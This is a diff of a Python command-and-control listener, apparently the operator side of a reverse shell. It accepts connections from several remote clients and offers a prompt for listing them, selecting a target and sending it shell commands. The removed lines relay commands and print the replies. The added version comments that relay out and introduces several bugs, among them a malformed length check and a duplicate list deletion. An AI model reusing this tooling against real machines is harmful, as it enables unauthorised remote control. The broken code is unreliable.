@@ -4,21 +4,21 @@ from queue import Queue
 import threading
 import sys
 
-N_THREADS = 2
-QUEUES = [1,2]
-q =  Queue()
-conection_queue = []
-addr_queue = []
+NUMBER_OF_THREADS = 2
+JOB_NUMBERS = [1,2]
+queue =  Queue()
+all_connections = []
+all_address = []
 
 #starting params
-def start_socket(host1 ,port1):
+def create_socket(port1=55550):
     try:
         global s 
         global host
         global port
 
         s = socket.socket()
-        host = host1
+        host = "localhost"
         port = port1
     except socket.error as err:
         print("Error al inicializar el socket "+str(err))
@@ -34,100 +34,116 @@ def bind_socket():
         s.listen(5)
     except socket.error as err:
         print("Error en binding : "+str(err))
+        bind_socket()
 
 
+#Aceptar conexiones entrantes
+def accepting_connection():
+    for c in all_connections:
+        c.close()
+    del all_connections[:]
+    del all_address[:]
 
-def start_instream():
-    del conection_queue[:]
-    del addr_queue[:]
     while True:
         try:
             con,addr = s.accept()
-            con.setblocking(0)
-            conection_queue.append(con)
-            addr_queue.append(addr)
-            print("Conexión nueva de "+str(addr[0])+":"+str(addr[1]))
+            s.setblocking(1)
+
+            all_connections.append(con)
+            all_address.append(addr)
+
+            print("Connection has been stablished to "+str(addr[0]))
         except:
-            print("Error en solicitud de conexión: ")
+            print("Error aceptando conexiones nuevas.")
 
 
 
-def list_items():
-    returner  = ""
-    if len(conection_queue) != 0:
-        for i,con in enumerate(conection_queue):
-            returner += "{} {}:{}\n".format(i,addr_queue[i][0],addr_queue[i][1])
-    else:
-        returner += "No se encuentran conexiones disponibles."
-
-    print("Conexiones disponibles:\n"+returner)
+def start_turtle():
+    while True:
+        cmd = input('turtle> ')
         
+        if cmd == 'list':
+            list_connections()
 
-def select_meet(i):
-    return conection_queue[i],addr_queue[i]
-
-
-def start_cmd():
-    while True:
-        print("shell>",end="")
-        cmd = input()
-        if(cmd == "list"):
-            list_items()
-        elif("select " in cmd):
-            cmd = cmd.replace("select ","")
-            tx,adr = select_meet(int(cmd))
-            join_meet(tx,adr)
-        elif(cmd == "quit"):
-            print("Hasta pronto.\n",end="")
-            q.task_done()
-            break
-            sys.exit(1)
-            print("Hasta pronto.\n",end="")
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
         else:
-            print("Comando no valido",end="")
-
-        print("\n",end="")
+            print("Command not recognized")
 
 
 
-def Worker():
+
+#List all connections available
+def list_connections():
+    results = ''
+    for i,conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(201480)
+        except:
+            del all_connections[i]
+            del all_connections[i]
+            continue
+        results = str(i)+str(all_address[i][0])+":"+str(all_address[i][1])+"\n"
+
+    print("--- Clients --- "+"\n"+results)
+
+
+
+
+def get_target(cmd):
+    try:
+        target = cmd.replace("select ","")
+        target = int(target)
+
+        conn = all_connections[target]
+        print("You are now connected to "+all_address[target][0])
+        print(str(all_address[target][0])+"> ",end="")
+        return conn
+    except:
+        print("Selection not valid.")
+        return None
+
+
+
+def send_target_commands(conn):
     while True:
-        item  = q.get()
-        if item == 1:
-            start_instream()
-        elif  item ==2:
-            start_cmd()
-        else:
-            q.task_done()
-
-
-
-def start_threading():
-    for _ in range(N_THREADS):
-        threading.Thread(target=Worker,daemon=True).start()
-
-
-def start_queue():
-    for i in QUEUES:
-        print("QUEUE : "+str(i))
-        q.put(i)
-    q.join()
-
-def join_meet(con,addr):
-    print("\n"+str(addr)+">>",end="")
-    while True:
-        cmd = input()
-        if cmd == "exit":
+        try:
+            cmd = input()
+            if cmd == 'quit':
+                break
+            if len(str.encode(cmd)>0):
+                print("Enviando cmd : "+cmd)
+                #conn.send(str.encode(cmd))
+                #client_response = str(conn.recv(20048),'utf-8')
+                #print(client_response,end="")
+        except Exception as ex:
+            print("Error sending commands."+str(ex))
             break
-        con.send(cmd.encode(encoding="utf-8"))
-        time.sleep(1.2)
-        datos = con.recv(2048)
-        datos.decode("utf-8")
-        print("{}\n{}>>".format(str(datos),str(addr)),end="")
 
 
 
-start_socket("localhost",40415)
-bind_socket()
-start_threading()
-start_queue()
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        threading.Thread(target=work,daemon=True).start()
+
+
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            create_socket()
+            bind_socket()
+            accepting_connection()
+        if x == 2:
+            start_turtle()
+        queue.task_done()
+def create_jobs():
+    for x in JOB_NUMBERS:
+        queue.put(x)
+    queue.join()
+
+create_workers()
+create_jobs()
